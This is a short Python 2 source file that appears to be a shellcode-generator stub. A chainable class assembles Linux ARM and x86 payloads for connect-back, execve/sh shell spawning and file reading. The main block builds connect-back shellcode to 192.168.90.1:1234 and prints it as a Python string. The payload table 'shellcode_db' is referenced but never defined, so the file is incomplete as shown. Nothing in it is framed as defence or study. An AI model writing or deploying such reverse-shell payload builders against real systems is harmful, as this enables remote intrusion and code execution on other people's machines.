# BEGIN pyshellcode_stub.py

import socket
import struct

def bin2py(sc, varname = "shellcode"):
	code = ""
	code += "%s = \"\"\n" % (varname)
	for i in range(0, len(sc), 16):
		line = sc[i:i+16]
		s = ""
		for x in line:
			s += "\\x%02x" % (ord(x))
		code += "%s += \"%s\"\n" % (varname, s)
	return code

class shellcode:
	def __init__(self, platform, architecture, optimization="unoptimized"):
		self.platform = platform
		self.architecture = architecture
		self.optimization = optimization
		self.code = ""
	def connect(self, ip, port):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["connect"][:-8]
		self.code += self.connect_parameters(ip, port)
		return self
	def connect_parameters(self, ip, port):
		return struct.pack("!H", port) + socket.inet_aton(ip)
	def helloworld(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["hello"]
		return self
	def execve(self, parameter_list):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve"][:-15]
		self.code += self.execve_parameters(parameter_list)
		return self
	def execve_parameters(self, parameter_list):
		p = ""
		for x in reversed(parameter_list):
			p += x + "\x00"
		p += "\x00"
		return p
	def execve_sh(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve_sh"]
		return self
	def exit(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["exit"]
		return self
	def readfile(self, filename):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["readfile"][:-11]
		self.code += self.readfile_params(filename)
		return self
	def readfile_params(self, filename):
		return filename + "\x00"


if __name__ == "__main__":
	s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
	print bin2py(s.code, "shellcode")
	s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
	print bin2py(s.code, "shellcode")

# END pyshellcode_stub.py